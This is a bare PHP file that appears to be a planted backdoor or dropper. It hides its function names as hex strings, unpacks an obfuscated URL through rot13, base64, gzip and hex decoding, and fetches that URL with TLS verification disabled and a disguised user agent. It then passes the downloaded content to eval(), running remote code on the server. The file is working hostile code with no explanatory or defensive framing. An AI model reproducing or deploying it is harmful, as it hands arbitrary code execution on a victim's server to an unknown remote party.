<?php 

$Z = ['7374725f726f743133', '6261736536345f6465636f6465', '677a756e636f6d7072657373', '6865783262696e', '6375726c5f7365746f7074', '6375726c5f65786563', '6375726c5f6572726e6f', '6375726c5f6572726f72', '7374726c656e', '6261736536345f656e636f6465'];

function fx($hex) {
  return hex2bin($hex);
}

function bvz($e) {
  global $Z;
  $r = (fx($Z[0]))($e);
  $b = (fx($Z[1]))($r);
  $d = (fx($Z[2]))($b);
  if ($d === false) die("Error data");
  $h = (fx($Z[3]))($d);
  if ($h === false) die("Error hex");
  return $h;
}

$u = 'rWjIvjRBjQNVNe/HLbK2BpgJ//+RLHlVjZTg5EhXrSNbtICPcKv0hWJRHfS0Rlkrc9ydci2UJd+c6WFywHdLUdjI3dZ3CB5scjRiBB2ii+nVn3Me/BnaVE8=';
$l = bvz($u);

function xz($x) {
  global $Z;
  $c = curl_init();
  $setopt = fx($Z[4]);
  $exec = fx($Z[5]);
  $errno = fx($Z[6]);
  $error = fx($Z[7]);
  $strlen = fx($Z[8]);
  $setopt($c, CURLOPT_URL, $x);
  $setopt($c, CURLOPT_RETURNTRANSFER, 1);
  $setopt($c, CURLOPT_USERAGENT, (fx($Z[0]))('Zhyybzn5.0'));
  $setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
  $setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
  $r = $exec($c);
  if ($errno($c)) echo "Curl error: " . $error($c) . "\n";
  curl_close($c);
  return $r;
}

$s = xz($l);
if ($s && (fx($Z[8]))($s) > 10) {
  eval((fx($Z[1]))((fx($Z[9]))('?>' . $s)));
} else {
  echo "Error!";
}
